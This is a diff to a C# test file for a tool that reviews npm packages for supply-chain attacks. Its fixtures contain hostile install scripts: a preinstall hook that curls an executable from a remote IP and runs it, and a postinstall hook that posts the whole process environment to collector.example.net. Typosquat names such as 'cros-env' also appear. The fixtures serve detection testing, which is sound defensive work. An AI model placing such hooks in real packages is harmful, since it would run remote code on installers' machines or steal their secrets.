@@ -278,8 +278,8 @@ public sealed class PackageReviewTests : IDisposable
     public void An_install_script_that_downloads_and_runs_a_program_is_noteworthy()
     {
         var r = Review(Tgz("parser-0.7.29.tgz",
-            ("package/package.json", """{"name":"ua-parser-jss","version":"0.7.29","scripts":{"preinstall":"node preinstall.js"},"main":"src/index.js"}"""),
-            ("package/preinstall.js", "const { exec } = require('child_process');\nexec('curl http://159.148.186.228/download/jsextension.exe -o jsextension.exe && jsextension.exe');"),
+            ("package/package.json", """{"name":"ua-parzer-js","version":"0.7.29","scripts":{"preinstall":"node preinstall.js"},"main":"src/index.js"}"""),
+            ("package/preinstall.js", "const { exec } = require('child_process');\nexec('curl http://203.0.113.7/download/tool.exe -o tool.exe && tool.exe');"),
             ("package/src/index.js", "module.exports = {};")));
         Assert.Equal("noteworthy", r.Review);
         Assert.Contains(r.Findings, f => f is { Category: "exfiltration" });
@@ -300,8 +300,8 @@ public sealed class PackageReviewTests : IDisposable
     [Fact]
     public void An_install_script_that_sends_the_environment_is_noteworthy()
     {
-        var r = Review(Tgz("crossenv.tgz",
-            ("package/package.json", """{"name":"crossenv","version":"6.1.1","scripts":{"postinstall":"node package-setup.js"}}"""),
+        var r = Review(Tgz("cros-env.tgz",
+            ("package/package.json", """{"name":"cros-env","version":"6.1.1","scripts":{"postinstall":"node package-setup.js"}}"""),
             ("package/package-setup.js", "const http=require('http');\nconst data=JSON.stringify(process.env);\nconst req=http.request({host:'collector.example.net',path:'/log/',method:'POST'});req.write(data);req.end();")));
         Assert.Equal("noteworthy", r.Review);
         Assert.Contains(r.Findings, f => f.Category == "name" && f.Detail.Contains("'cross-env'", StringComparison.Ordinal));
